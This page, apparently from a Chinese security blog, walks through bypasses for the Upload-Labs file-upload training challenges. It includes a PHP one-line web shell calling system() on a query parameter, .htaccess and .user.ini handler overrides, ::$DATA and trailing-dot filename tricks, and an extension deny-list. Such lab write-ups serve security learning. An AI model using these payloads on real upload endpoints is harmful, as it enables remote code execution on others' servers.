@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html  lang="en" >
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+    <title>文件上传总结 | h00ls</title>
+    <meta name="description" content="文件上传Upload-Labs主要代码 123456789$deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传总结">
+<meta property="og:url" content="http://example.com/2021/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="h00ls">
+<meta property="og:description" content="文件上传Upload-Labs主要代码 123456789$deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027110151189.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027110247950.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027113432599.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027113715301.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027125150328.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027135514245.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027135956956.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027152107982.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027153852102.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027154201867.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027154329217.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027154652592.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027171736795.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201028091147369.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201028124743651.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201028130948272.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029132842.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029132851.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029132858.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029135515.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029140041.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029141747.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo/images/imagesimage-20201107125711752.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo/images/20201107131352.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo/images/20201107131712.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo/images/20201107152713.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo/images/20201107170002.png">
+<meta property="og:image" content="https://pureqh.top/wp-content/uploads/2019/07/image-56.png">
+<meta property="article:published_time" content="2021-03-23T12:37:08.000Z">
+<meta property="article:modified_time" content="2021-03-23T12:38:30.404Z">
+<meta property="article:author" content="h00ls">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027110151189.png">
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml">
+    <link rel="icon" href="/images/favicon.png" type="image/x-icon">
+
+    
+<link rel="stylesheet" href="/css/common.min.css">
+
+
+
+    
+    
+    
+    
+        <link href="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/css/lightgallery.min.css" rel="stylesheet">
+    
+    
+    
+<link rel="stylesheet" href="/css/iconfont.min.css">
+
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+    <body>
+        <header class="header header-fixture">
+    <div class="profile-search-wrap flex sm:block">
+        
+        
+        <div class="profile sm:text-center md:px-1 lg:px-3 sm:pb-4 sm:pt-6">
+            <a id="avatar" role="link" href="https://github.com/h00ls" class="inline-block lg:w-16 lg:h-16 w-8 h-8 m-2" target="_blank" rel="noopener" rel="noreferrer" >
+                <img src="https://www.gravatar.com/avatar/0bc83cb571cd1c50ba6f3e8a78ef1346?s=128" class="rounded-full" alt="avatar">
+            </a>
+            <h2 id="name" class="hidden lg:block">h00ls</h2>
+            <h3 id="title" class="hidden xl:block">安全那些事</h3>
+            
+            <small id="location" class="hidden lg:block">
+                <i class="iconfont icon-map-icon"></i>
+                Sichuan, China
+            </small>
+            
+        </div>
+        
+        
+<div class="search flex-1 flex lg:inline-block sm:hidden lg:px-4 lg:mt-2 lg:mb-4 lg:w-full">
+    <form id="search-form" class="my-auto flex-1 lg:border lg:border-solid lg:border-gray-200">
+        <div class="input-group table bg-gray-100 lg:bg-white w-full">
+            <input id="search-input" type="text" placeholder="Search" class="inline-block w-full bg-gray-100 lg:bg-white">
+            <span class="table-cell">
+                <button name="search tigger button" disabled>
+                    <i class="iconfont icon-search m-2"></i>
+                </button>
+            </span>
+        </div>
+    </form>
+        
+<script id="search-teamplate" type="text/html" data-path="/content.json">
+    <div>
+        <div class="search-header bg-gray-400">
+            <input id="actual-search-input" model="keyword" ref="input" class="inline-block w-full h-10 px-2 py-1" placeholder="Search" type="text">
+        </div>
+        <div class="search-result bg-gray-200">
+            {{#each searchPosts}}
+            <a href="/{{ path }}" class="result-item block px-2 pb-3 mb-1 pt-1 hover:bg-indigo-100">
+                <i class="iconfont icon-file"></i>
+                <h1 class="result-title inline font-medium text-lg">{{ title }}</h1>
+                <p class="result-content text-gray-600 text-sm">{{{ text }}}</p>
+            </a>
+            {{/each}}
+        </div>
+    </div>
+</script>
+
+</div>
+
+
+        <button name="menu toogle button" id="menu-toggle-btn" class="block sm:hidden p-3" role="button" aria-expanded="false">
+            <i class="iconfont icon-hamburger"></i>
+        </button>
+    </div>
+    <nav id="menu-nav" class="hidden sm:flex flex-col">
+        
+        
+            <div class="menu-item menu-home" role="menuitem">
+                <a href="/.">
+                    <i class="iconfont icon-home" aria-hidden="true"></i>
+                    <span class="menu-title">Home</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-archives" role="menuitem">
+                <a href="/archives">
+                    <i class="iconfont icon-archive" aria-hidden="true"></i>
+                    <span class="menu-title">Archives</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-categories" role="menuitem">
+                <a href="/categories">
+                    <i class="iconfont icon-folder" aria-hidden="true"></i>
+                    <span class="menu-title">Categories</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-tags" role="menuitem">
+                <a href="/tags">
+                    <i class="iconfont icon-tag" aria-hidden="true"></i>
+                    <span class="menu-title">Tags</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-repository" role="menuitem">
+                <a href="/repository">
+                    <i class="iconfont icon-project" aria-hidden="true"></i>
+                    <span class="menu-title">Repository</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-links" role="menuitem">
+                <a href="/links">
+                    <i class="iconfont icon-friend" aria-hidden="true"></i>
+                    <span class="menu-title">Links</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-about" role="menuitem">
+                <a href="/about">
+                    <i class="iconfont icon-cup" aria-hidden="true"></i>
+                    <span class="menu-title">About</span>
+                </a>
+            </div>
+        
+        
+<div class="social-links flex sm:flex-col lg:hidden mt-5">
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://github.com/h00ls">
+                <i class="iconfont social-icon icon-github"></i>
+                <span class="menu-title hidden lg:inline">menu.github</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a href="/atom.xml">
+                <i class="iconfont social-icon icon-rss"></i>
+                <span class="menu-title hidden lg:inline">menu.rss</span>
+            </a>
+        </span>
+    
+</div>
+
+
+    </nav>
+</header>
+
+        <section class="main-section">
+            
+    <main class="flex-1 px-4 py-12 md:px-5 lg:px-8 lg:py-4 relative min-h-screen">
+    
+
+    <article class="content article article-archives article-type-list" itemscope="">
+        <header class="article-header">
+            
+    
+        <h1 class="article-title text-lg" itemprop="name">
+            文件上传总结
+        </h1>
+    
+
+
+
+            <p class="article-meta mb-3 text-xs">
+                <span class="article-date">
+    <i class="iconfont icon-calendar-check"></i>
+	<a href="/2021/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" class="article-date">
+	  <time datetime="2021-03-23T12:37:08.000Z" itemprop="datePublished">Mar 23</time>
+	</a>
+</span>
+                
+
+                
+    <span class="article-tags">
+    <i class="iconfont icon-tag"></i>
+    <a class="article-tag-none-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a>
+  </span>
+
+
+                <span class="_partial/post-comment"><i class="icon icon-comment"></i>
+                    <a href="/2021/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#comments" class="article-comment-link">
+                        Comments
+                    </a>
+                </span>
+                
+
+
+    
+        <span class="post-wordcount" itemprop="wordCount">Word Count: 3.9k(words)</span>
+    
+	
+	
+    
+        <span class="post-readcount" itemprop="timeRequired">Read Count: 16(minutes)</span>
+    
+	
+	
+    
+		<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+		<span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span></span>
+		<span class="post-meta-divider"> | </span>
+		<span id="busuanzi_container_site_uv">UV: <span id="busuanzi_value_site_uv"></span></span>
+
+    
+	
+	
+
+
+            </p>
+        </header>
+        <div class="marked-body article-body">
+            <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="Upload-Labs"><a href="#Upload-Labs" class="headerlink" title="Upload-Labs"></a>Upload-Labs</h2><p>主要代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>))&#123; ..... &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="上传属性判断"><a href="#上传属性判断" class="headerlink" title="上传属性判断"></a>上传属性判断</h3><h4 id="关卡1"><a href="#关卡1" class="headerlink" title="关卡1"></a>关卡1</h4><p>方案一：直接禁用js，然后刷新页面即可上传</p>
+<p>方案二：burpsuite抓包修改后缀</p>
+<p>方案三：修改js代码，我修改后js后并没有按照我修改的代码执行，不知道怎么回事</p>
+<p>方案四：用F12打断点调试，修改js的变量</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027110151189.png" alt="image-20201027110151189"></p>
+<p>使用在Console中修改 <code>allow_ext</code> 的变量，即可上传</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027110247950.png" alt="image-20201027110247950"></p>
+<h4 id="关卡二"><a href="#关卡二" class="headerlink" title="关卡二"></a>关卡二</h4><p>后端使用<code>$_FILES[&#39;upload_file&#39;][&#39;type&#39;]</code> 获取文件类型判断，从而决定是否被上传。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027113432599.png" alt="image-20201027113432599"></p>
+<p>使用burp suite拦截，修改 <code>content-type</code></p>
+<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><h4 id="关卡三"><a href="#关卡三" class="headerlink" title="关卡三"></a>关卡三</h4><p>环境条件：</p>
+<ul>
+<li>老版本phpstudy也就是apache版本为2.4.23</li>
+<li>php &lt;= 5.5.38</li>
+<li>去掉注释：<code> AddType application/x-httpd-php .php .phtml</code> 表示想把<code>.phtml</code>的文件按照php解析</li>
+</ul>
+<p>看提示是黑名单过滤</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027113715301.png" alt="image-20201027113715301"></p>
+<p>那就用别名搞，像php3、phtml、php4等。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027125150328.png" alt="image-20201027125150328"></p>
+<h4 id="关卡四"><a href="#关卡四" class="headerlink" title="关卡四"></a>关卡四</h4><p><strong>利用条件</strong></p>
+<ul>
+<li><p>5.6以下且不带nts的php版本</p>
+</li>
+<li><p>修改apache配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &#x2F;&gt;</span><br><span class="line">    Options +Indexes +FollowSymLinks +ExecCGI   # 默认开启</span><br><span class="line">    AllowOverride All   # 默认为None</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br></pre></td></tr></table></figure>
+<p>看提示，拦截的更多了。</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</span><br></pre></td></tr></table></figure>
+<p>上传<code>.htaccess</code>文件，内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方式一：表示全都按照php解析</span><br><span class="line">SetHandler application&#x2F;x-httpd-php </span><br><span class="line"></span><br><span class="line">方式二：只是png的后缀会按照php解析</span><br><span class="line">&lt;FilesMatch &quot;\.png$&quot;&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="关卡五"><a href="#关卡五" class="headerlink" title="关卡五"></a>关卡五</h4><h5 id="姿势一-解析漏洞"><a href="#姿势一-解析漏洞" class="headerlink" title="姿势一: 解析漏洞"></a>姿势一: 解析漏洞</h5><p>在Apache 2.0.x &lt;= 2.0.59，Apache 2.2.x &lt;= 2.2.17，Apache 2.2.2 &lt;= 2.2.8中Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。</p>
+<p><strong>条件：</strong></p>
+<ul>
+<li>多后缀解析漏洞需要在httpd.conf中开启 <code>AddType application/x-httpd-php .php</code> </li>
+<li>php版本 &lt; 5.5.38  非nts</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027135514245.png" alt="image-20201027135514245"></p>
+<p>多后缀解析特性：Apache 持一个文件拥有多个后缀，当不认识最后一个后缀就会向前继续识别后缀，如果先遇到png，就会当成图片处理，如果先遇到zip就会当成压缩包处理，同样如果先遇到php就会当成php解析。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027135956956.png" alt="image-20201027135956956"></p>
+<h5 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h5><p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/13121301.html">预备知识</a></strong></p>
+<p>从<code>php5.3</code>开始，启动了<code>.user.ini</code>。现在大部分网站都是用的<code>fastcgi</code>，这个东西我理解的是可以提供web服务器的一种<code>api</code>，而<code>apache</code>/<code>nginx</code>/<code>iis</code>这些服务器都会依靠这种<code>api</code>来运行。而在服务器以<code>fastcgi</code>启动运行的时候，<code>.user.ini</code>也是<code>php</code>的一种配置文件，众所周知<code>php.ini</code>是<code>php</code>的配置文件，它可以做到显示报错，导入扩展，文件解析，web站点路径等等设置。但是如果想要把某个文件里面的配置与全局的<code>php.ini</code>不同，则可以在<code>php文件</code>中加上<code>ini_set()</code>来配置特定的配置变量。</p>
+<p>而<code>.user.ini</code>和<code>.htaccess</code>一样是对当前目录的所以<code>php</code>文件的配置设置，即写了<code>.user.ini</code>和它同目录的文件会优先使用<code>.user.ini</code>中设置的配置属性。</p>
+<p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的<code>php.ini</code>，我们可以自定义除了<code>PHP_INI_SYSTEM</code>以外的模式，<u>在执行php代码之前，系统会对<code>.user.ini</code>先做一个执行，然后才执行其他的php文件。</u>有以下两种方式：</p>
+<ol>
+<li>auto_prepend_file表示在加载第一个php代码之前预加载改配置文件所指示的PHP文件</li>
+<li>auto_append_file表示在加载第一个php代码之后执行预加载该配置所指示的PHP文件</li>
+</ol>
+<p><strong>利用条件：</strong></p>
+<ul>
+<li>需要php带nts。</li>
+<li>上传的 <code>.user.ini</code> 和 图片一句话木马 同一个目录中还需要有个可执行的php代码</li>
+</ul>
+<p>上传一个 <code>.user.ini</code> 内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.gif</span><br><span class="line"># 或者 </span><br><span class="line">auto_append_file&#x3D;1.gif</span><br></pre></td></tr></table></figure>
+<p>然后上传<code>1.gif</code>的图片木马:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后访问：<code>http://192.168.124.23/upload/readme.php?cmd=ipconfig</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027152107982.png" alt="image-20201027152107982"></p>
+<p>实际上就是当<code>.user.ini、1.gif、readme.php</code>在同一个文件夹下时，访问readme.php之前，会先加载<code>.user.ini</code>配置文件，而配置文件里面的内容相当于文件包含，包含了<code>1.gif</code></p>
+<p><code>.user.ini</code>比<code>.htaccess</code>使用更加广泛</p>
+<h4 id="关卡6"><a href="#关卡6" class="headerlink" title="关卡6"></a>关卡6</h4><h5 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h5><p>看到源代码没了 <code>tolower函数</code>，那就是可以大小写绕过咯？</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027153852102.png" alt="image-20201027153852102"></p>
+<p>过滤几个大写<code>pHp</code>，没有过滤完所有的大小写组合的可能后缀名，换个大写绕过<code>PhP</code>绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027154201867.png" alt="image-20201027154201867"></p>
+<p><strong>一直踏的坑</strong>：nts版本php，大小写绕不过去？反正就是服务器内部故障</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027154329217.png" alt="image-20201027154329217"></p>
+<h5 id="姿势二-1"><a href="#姿势二-1" class="headerlink" title="姿势二"></a>姿势二</h5><p><strong>只是针对Windows系统的服务器</strong></p>
+<p>看到有一处<code>str_replace</code>函数，还是替换的为空，那不就双重名字直接怼他，来个<code>::::$DATA$DATA</code>，首先php替换成<code>::$DATA</code>，在内存中为<code>tmpName.php::$DATA</code>。在window中的时候如果  文件名+<code>&quot;::$DATA&quot;</code>  会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名。</p>
+<p><strong>扩展</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">需要上传的文件内容为：&lt;?php phpinfo();?&gt;下面是上传是会出现的现象：</span><br><span class="line">上传的文件名 服务器表面现象  生成的文件内容</span><br><span class="line">Test.php:a.jpg   生成Test.php 空</span><br><span class="line">Test.php::$DATA 生成test.php &lt;?php phpinfo();?&gt;</span><br><span class="line">Test.php::$INDEX_ALLOCATION 生成test.php文件夹 </span><br><span class="line">Test.php::$DATA\0.jpg 生成0.jpg &lt;?php phpinfo();?&gt;</span><br><span class="line">Test.php::$DATA\aaa.jpg 生成aaa.jpg &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/swyft/p/5490872.html">https://www.cnblogs.com/swyft/p/5490872.html</a></li>
+</ul>
+<h4 id="关卡七"><a href="#关卡七" class="headerlink" title="关卡七"></a>关卡七</h4><h5 id="姿势一-1"><a href="#姿势一-1" class="headerlink" title="姿势一"></a>姿势一</h5><p>利用条件：</p>
+<ul>
+<li>php &lt;= 7.0.12</li>
+</ul>
+<p>空格绕过，没说的。没遇上问题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027154652592.png" alt="image-20201027154652592"></p>
+<p>代码比较</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Lesson6中源代码如下:</span><br><span class="line">	$file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);   # 过滤了两边的空格</span><br><span class="line"># Lesson7中源代码如下：</span><br><span class="line">  $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];   # 没有过滤两边的空格 </span><br></pre></td></tr></table></figure>
+<p>我以为空格有什么有什么特别的绕过姿势，然后断点调试了下，发现也就只是把空格当成文件名的一部分处理了，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027171736795.png" alt="image-20201027171736795"></p>
+<h5 id="姿势二-2"><a href="#姿势二-2" class="headerlink" title="姿势二"></a>姿势二</h5><p>和关卡6姿势二一样</p>
+<h4 id="关卡八"><a href="#关卡八" class="headerlink" title="关卡八"></a>关卡八</h4><h5 id="姿势一：末尾加-绕过。"><a href="#姿势一：末尾加-绕过。" class="headerlink" title="姿势一：末尾加.绕过。"></a><strong>姿势一：末尾加<code>.</code>绕过。</strong></h5><p>Windows创建文件时，如<code>eval.php............</code> 只会识别成<code>eval.php</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201028091147369.png" alt="image-20201028091147369"></p>
+<h5 id="姿势二："><a href="#姿势二：" class="headerlink" title="姿势二："></a><strong>姿势二：</strong></h5><p>使用双重<code>::$DATA</code>绕过</p>
+<h4 id="关卡九"><a href="#关卡九" class="headerlink" title="关卡九"></a>关卡九</h4><p>使用一个<code>::$DATA</code>直接绕过</p>
+<h4 id="关卡十"><a href="#关卡十" class="headerlink" title="关卡十"></a>关卡十</h4><p>看下关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,.....,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;    <span class="comment">// 这里的 $file_name</span></span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span 